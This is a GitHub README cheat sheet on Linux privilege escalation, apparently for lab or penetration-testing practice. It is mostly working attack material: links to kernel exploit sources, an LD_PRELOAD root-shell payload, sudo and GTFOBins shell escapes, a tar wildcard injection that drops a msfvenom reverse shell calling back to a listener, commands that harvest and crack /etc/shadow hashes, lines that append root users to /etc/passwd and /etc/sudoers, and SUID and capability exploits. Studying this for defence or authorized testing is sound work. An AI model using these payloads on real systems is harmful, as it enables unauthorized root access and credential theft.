

![Cover-Image](https://user-images.githubusercontent.com/95465072/214883789-1f48e8ab-9de0-4693-b0f2-94f42e433c4f.png)


<!-- # Linux Privilege Escalation 🦁 -->

&nbsp;

## 📜 Overview
1 [Escalating via Kernel Exploits](https://github.com/sujayadkesar/Linux-Privilege-Escalation#1-escalation-by-kernel-exploits)<br>
2 [Escalation  by File permission & Passwords](https://github.com/sujayadkesar/Linux-Privilege-Escalation#2-escalation-via-file-permission-and-passwords-)<br>
 -  OLD PASSWORDS IN /ETC/SECURITY/OPASSWD
 -   LAST EDITED FILES
 -  IN MEMORY PASSWORDS
 -  FIND SENSITIVE FILES
 -  WEAK FILE PERMISSION READABLE | WRITABLE /etc/shadow
 
3 [Exploiting SUDO](https://github.com/sujayadkesar/Linux-Privilege-Escalation#3-escalation-by--sudo)<br>
  - NOPASSWORD
  - LD_PRELOAD
  - DOAS
  - SUDO INJECT
  
4 [GTFOBINS](https://github.com/sujayadkesar/Linux-Privilege-Escalation#4-gtfobins)<br>
5 [Wildcard](https://github.com/sujayadkesar/Linux-Privilege-Escalation#5-wildcard)<br>
  - WRITABLE FILES
  - WRITABLE /etc/passwd
  - WRITABLE /etc/sudoers
  
6 [NFS Root Squashing](https://github.com/sujayadkesar/Linux-Privilege-Escalation#6-nfs-root-squashing)<br>
7 [Scheduled Tasks](https://github.com/sujayadkesar/Linux-Privilege-Escalation#7-scheduled-tasks)<br>
8 [SUID](https://github.com/sujayadkesar/Linux-Privilege-Escalation#8-suid)<br>
   - Find SUID Binaries
9 [Capabilities](https://github.com/sujayadkesar/Linux-Privilege-Escalation#9-capabilities)<br>
&nbsp;
&nbsp;
&nbsp;

## 1 Escalation By ```Kernel Exploits```

⚡[Linux Kernel < 2.6.37-rc2 ACPI custom_method Privilege Escalation](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C0__TO___2%2C6%2C36.c)<br>
⚡[Linux Kernel - 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel__5%2C8%2C0__TO__5%2C16%2C11.c)<br>
⚡[Linux Kernel - 2.4.20 To 2.4.27 mremap missing do_munmap return check kernel exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C4%2C20__TO__2%2C4%2C27.c)<br>
⚡[Linux Kernel - 2.4.29 uselib VMA insert race vulnerability](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C4%2C29.c)<br>
⚡[Linux Kernel < 2.6.36-rc6 pktcdvd Kernel Memory Disclosure](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C0__TO___2%2C6%2C36.c)<br>
⚡[Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel__2%2C6%2C0__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel < 2.6.11 Local integer overflow Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C5__TO__2%2C6%2C11.c)<br>
⚡[Linux Kernel - 2.6.0-2.6.16 Local Race](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C8__TO__2%2C6%2C16.c)<br>
⚡[Linux kernel < 2.6.22 open/ftruncate local exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C11__TO__2%2C6%2C22.c)<br>
⚡[Linux Kernel < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C18__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel - 2.6.28 To 3.7.6 _X86_MSR Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C18__TO__3%2C7%2C6.c)<br>
⚡[Linux kernel <2.6.29 exit_notify() local root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C25__TO__2%2C6%2C29.sh)<br>
⚡[Linux Kernel-  2.6.34 To 2.6.36 CAP_SYS_ADMIN to root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C34__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel - 3.0 To 3.8.9 perf_swevent_init Local root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C0%2C0__TO__3%2C8%2C9.c)<br>
⚡[Linux Kernel - 3.4.0 To 3.13.1 CVE-2014-0038](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C4%2C0__TO__3%2C13%2C1.c)<br>
⚡[Linux Kernel-  3.8.0 To 3.13.1 CVE-2016-072 PP_KEY](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C8%2C0__TO__3%2C13%2C1.c)<br>





## 2] Escalation Via File permission and Passwords 🔑📂

Search For **File containing password**
```sh
grep  --color=auto  -rnw  '/'  -ie  "PASSWORD"  --color=always  2>  /dev/null 
```
```
find  .  -type  f  -exec  grep  -i  -I  "PASSWORD"  {}  /dev/null  \;
```
### OLD PASSWORDS IN /ETC/SECURITY/OPASSWD

The  `/etc/security/opasswd`  file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.

:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes


### LAST EDITED FILES

Files that were edited in the last 10 minutes

```
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

```

### IN MEMORY PASSWORDS

```
strings /dev/mem -n10 | grep -i PASS

```

### FIND SENSITIVE FILES

```
$ locate password | more 
/etc/passwd
/etc/passwd-
/etc/alternatives/vncpasswd
/etc/alternatives/vncpasswd.1.gz
/etc/exim4/passwd.client
/etc/pam.d/chpasswd
/etc/pam.d/passwd
```

### Weak File Permissions Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

you can check whether it is readable by normal user or not by the following command

`ls -l /etc/shadow`

View the contents of the /etc/shadow file:

`cat /etc/shadow`

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali  VM  and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Switch to the root user, using the cracked password:

`su root`

### Writable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

check whether it is writable or not by the following command 
`ls -la /etc/shadow`

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`  

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`

## 3] Escalation By  SUDO

&nbsp;
&nbsp;

### NOPASSWD

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```
$ sudo -l
User local_host may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user  `local_host`  can run  `vim`  as  `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling  `sh`.

```
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```
&nbsp;

### LD_PRELOAD AND NOPASSWD

If  `LD_PRELOAD`  is explicitly defined in the sudoers file use the following exploit code 
 copy -> save -> compile -> execute!!



```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```
 `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Execute any binary with the LD_PRELOAD to spawn a shell :  `sudo LD_PRELOAD=/tmp/shell.so find`

&nbsp;

### DOAS

There are some alternatives to the  `sudo`  binary such as  `doas`  for OpenBSD, remember to check its configuration at  `/etc/doas.conf`

```
permit nopass local_host as root cmd vim
```
&nbsp;


### SUDO_INJECT

Using  [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```
$ sudo whatever
[sudo] password for user:    
# Press <ctrl>+c since you don't have the password.
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```
&nbsp;


## 4] GTFOBins

[GTFOBins](https://gtfobins.github.io/)  is a collection of scripts that can be used to bypass local security restrictions in various applications and services. These scripts leverage various features or misconfigurations in these applications to allow an attacker to run arbitrary commands with escalated privileges.

> gdb -nx -ex ‘!sh’ -ex quit  
> sudo mysql -e ‘! /bin/sh’  
> strace -o /dev/null /bin/sh  
> sudo awk ‘BEGIN {system(“/bin/sh”)}’

&nbsp;

## 5] Wildcard
View the contents of the other cron job script:

cat /usr/local/bin/compress.sh

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

chmod +x /home/user/shell.elf

Create these two files in /home/user:

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444
&nbsp;


## Writable files

List world writable files on the system.

```
find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```
```
find / -perm -2 -type f 2>/dev/null
```
```
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### WRITABLE /ETC/PASSWD

First generate a password with one of the following commands.

```
openssl passwd -1 -salt hack hack
mkpasswd -m SHA-512 hack
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user  `hack`  and add the generated password.

```
hack:GENERATED_PASSWORD_HERE:0:0:Hack:/root:/bin/bash
```

E.g:  `hack:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hack:/root:/bin/bash`

You can now use the  `su`  command with  `hack:hack`

Alternatively you can use the following lines to add a dummy user without a password.  
WARNING: you might degrade the current security of the machine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy

```



### WRITABLE /ETC/SUDOERS

```
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers

```
&nbsp;

## 6] NFS Root Squashing

When  **no_root_squash**  appears in  `/etc/exports`, the folder is shareable and a remote user can mount it

```
# create dir
mkdir /tmp/nfsdir  

# mount directory
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
cd /tmp/nfsdir

# copy wanted shell
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```



## 7] Scheduled tasks

### CRON JOBS

Check if you have access with write permission on these files.  


```
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*

```

You can use  [pspy](https://github.com/DominicBreuker/pspy)  to detect a CRON job.

```
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000
```

### Systemd timers

```
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
```
&nbsp;

## 8] SUID

SUID/Setuid stands for “set user ID upon execution”, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is  `root`, the uid will be changed to  `root`  even if it was executed from user  `bob`. SUID bit is represented by an  `s`.

```
╭─local_host@kali ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo

```

### Known Exploits

```echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

save this code as exploit.sh and execute to escalate


### FIND SUID BINARIES

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```
```
find / -uid 0 -perm -4000 -type f 2>/dev/null
```


### CREATE A SUID BINARY

```
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
```
```
gcc -o /tmp/suid /tmp/suid.c  
```
```
sudo chmod +x /tmp/suid 
```
```
sudo chmod +s /tmp/suid 
```
&nbsp;
## 9] Capabilities

### LIST CAPABILITIES OF BINARIES

```
╭─local_host@kali ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### EDIT CAPABILITIES

```
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

### INTERESTING CAPABILITIES

Having the capability =ep means the binary has all the capabilities.

```
$ getcap openssl /usr/bin/openssl
openssl=ep
```

Example of privilege escalation with  `cap_setuid+ep`

```
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```
